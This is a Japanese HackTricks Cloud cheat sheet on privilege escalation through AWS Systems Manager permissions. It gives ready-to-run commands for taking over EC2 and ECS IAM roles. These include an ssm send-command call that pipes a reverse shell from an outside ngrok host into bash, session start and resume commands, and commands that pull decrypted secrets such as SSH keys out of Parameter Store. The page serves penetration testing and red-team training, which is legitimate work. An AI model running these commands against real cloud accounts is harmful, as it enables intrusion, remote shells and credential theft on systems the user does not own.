# AWS - SSM 特権昇格

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
* **ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

## SSM

SSMに関する詳細情報は次を参照してください:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `ssm:SendCommand`

**`ssm:SendCommand`** 権限を持つ攻撃者は、Amazon SSM Agentを実行しているインスタンスで**コマンドを実行**し、その中で実行されているIAMロールを**侵害**することができます。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"
```
以下の手法を使用してすでに侵害されたEC2インスタンス内で特権を昇格させる場合は、次のコマンドでローカルにrevシェルをキャプチャできます:
```bash
# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**潜在的影響:** SSM エージェントが実行されているインスタンスにアタッチされている EC2 IAM ロールへの直接的な昇格。

### `ssm:StartSession`

**`ssm:StartSession`** 権限を持つ攻撃者は、Amazon SSM エージェントが実行されているインスタンスで **SSH のようなセッションを開始** し、その中で実行されている IAM ロールを **侵害** できます。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
{% hint style="danger" %}
セッションを開始するには、**SessionManagerPlugin** がインストールされている必要があります: [https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html)
{% endhint %}

**潜在的な影響:** 実行中のインスタンスにアタッチされているEC2 IAMロールへの直接権限昇格が可能です。SSMエージェントが実行されています。

#### ECSへの権限昇格

**ECSタスク**が**`ExecuteCommand`が有効**になって実行される場合、十分な権限を持つユーザーは`ecs execute-command`を使用してコンテナ内でコマンドを実行できます。\
[**ドキュメント**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/)によると、これは、"exec"コマンドを開始するデバイスとSSMセッションマネージャーを介してターゲットコンテナ間に安全なチャネルを作成することによって行われます（SSMセッションマネージャープラグインが必要です）。\
したがって、`ssm:StartSession`権限を持つユーザーは、そのオプションが有効になっているECSタスク内でシェルを取得できます。単に次のコマンドを実行します:
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../.gitbook/assets/image (185).png>)

**潜在的影響:** `ExecuteCommand` が有効になっている実行中のタスクにアタッチされた `ECS` IAM ロールへの直接的な権限昇格。

### `ssm:ResumeSession`

**`ssm:ResumeSession`** 権限を持つ攻撃者は、Amazon SSM エージェントが実行されているインスタンスで **SSH のようなセッションを再開** し、**切断された** SSM セッション状態で **実行されているIAMロールを侵害** することができます。
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**潜在的影響:** SSM エージェントが実行され、セッションが切断されている場合に、実行中のインスタンスにアタッチされた EC2 IAM ロールへの直接的な権限昇格が発生する可能性があります。

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

上記の権限を持つ攻撃者は、**SSM パラメータ**をリストアップし、**平文で読み取る**ことができます。これらのパラメータには、SSH キーまたは API キーなどの**機密情報**が頻繁に含まれています。
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**潜在的影響:** パラメータ内の機密情報を見つける。

### `ssm:ListCommands`

この権限を持つ攻撃者は、送信されたすべての**コマンド**をリストアップし、それらから**機密情報**を見つけることができるかもしれません。
```
aws ssm list-commands
```
**潜在的影響:** コマンドライン内の機密情報を見つける。

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

これらの権限を持つ攻撃者は、送信されたすべての**コマンド**をリストアップし、生成された出力を読むことができ、それに含まれる**機密情報**を見つける可能性があります。
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**潜在的影響:** コマンドラインの出力の中に機密情報を見つける。

### Codebuild

Codebuildプロジェクト内に入るためにSSMを使用することもできます:

{% content-ref url="aws-codebuild-privesc.md" %}
[aws-codebuild-privesc.md](aws-codebuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
